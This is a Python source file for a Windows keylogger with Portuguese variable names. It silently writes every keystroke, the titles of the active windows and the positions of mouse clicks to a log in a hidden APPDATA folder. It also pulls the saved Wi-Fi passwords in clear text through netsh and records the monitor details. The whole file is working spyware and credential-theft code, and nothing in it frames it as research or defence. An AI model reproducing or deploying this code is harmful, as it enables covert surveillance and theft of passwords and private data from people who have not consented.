from pynput import mouse
from pynput import keyboard
import datetime
import time
import os
import win32gui
import subprocess
from screeninfo import get_monitors

class KeyLogger():
    try:
        os.mkdir(os.getenv('APPDATA')+'/Logs')
    except:
        pass
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, NomeDoArquivo: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
        self.NomeDoArquivo = NomeDoArquivo
        self.j2 = ''

    @staticmethod
    def get_monitors(self):
        with open(self.NomeDoArquivo, 'a') as logs:
            for monitores in get_monitors():
                logs.write(str(monitores))

    def get_WiFi(self):
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']) 
        data = meta_data.decode('utf-8', errors ="backslashreplace")
        data = data.split('\n') 
        perfis = []
        with open(self.NomeDoArquivo, 'a') as logs:
            for i in data:
                if "All User Profile" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
                if "Todos os Perfis" in i :
                    i = i.split(":")
                    i = i[1]
                    i = i[1:-1]
                    perfis.append(i)
            logs.write("\n{:<30}| {:<}".format("Nome do Wi-Fi (SSID)", "Senha"))
            logs.write("\n----------------------------------------------")
            for i in perfis:
                try:
                    registros = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
                    registros = registros.decode('utf-8', errors ="backslashreplace")
                    registros = registros.split('\n')
                    senha = [b.split(":")[1][1:-1] for b in registros if "Key Content" in b]
                    if senha == []:
                        senha = [b.split(":")[1][1:-1] for b in registros if "da Chave" in b]
                    try:
                        logs.write("\n{:<30}| {:<}".format(i, senha[0]))
                    except IndexError:
                        logs.write("\n{:<30}| {:<}".format(i, ""))
                except subprocess.CalledProcessError:
                    print('Erro')
            logs.write("\n----------------------------------------------\n")
        return

    def get_char(self,Tecla):
        try:
            if Tecla.char != None:
                return Tecla.char
            else:
                if str(Tecla) == '<96>':
                    return '0'
                if str(Tecla) == '<97>':
                    return '1'
                if str(Tecla) == '<98>':
                    return '2'
                if str(Tecla) == '<99>':
                    return '3'
                if str(Tecla) == '<100>':
                    return '4'
                if str(Tecla) == '<101>':
                    return '5'
                if str(Tecla) == '<102>':
                    return '6'
                if str(Tecla) == '<103>':
                    return '7'
                if str(Tecla) == '<104>':
                    return '8'
                if str(Tecla) == '<105>':
                    return '9'
        except AttributeError:
            if str(Tecla) == 'Key.space':
                Tecla = str(Tecla).replace('Key.space',' ')
            if str(Tecla) == 'Key.enter':
                Tecla = str(Tecla).replace('Key.enter','\n')
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_win_name())
            logs.write(self.get_char(Tecla))

    def on_click(self, x, y, botao, pressionado):
        if pressionado:
            with open(self.NomeDoArquivo, 'a') as logs:
                logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, botao))
            
    def get_win_name(self):
        janela = win32gui
        self.j1 = janela.GetWindowText(janela.GetForegroundWindow())
        if self.j1 != self.j2:
            self.j2 = self.j1
            return '\n+- '+self.j2+' -+\n'
        else:
            return ''

    def main(self):
        escuta1 = keyboard.Listener(
            on_press = self.on_press,
        )
        escuta2 = mouse.Listener(
            on_click = self.on_click,
        )
        escuta1.start()
        escuta2.start()
        self.get_monitors(self)
        self.get_WiFi()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    looper = 0
    while looper == 0:
        time.sleep(3600)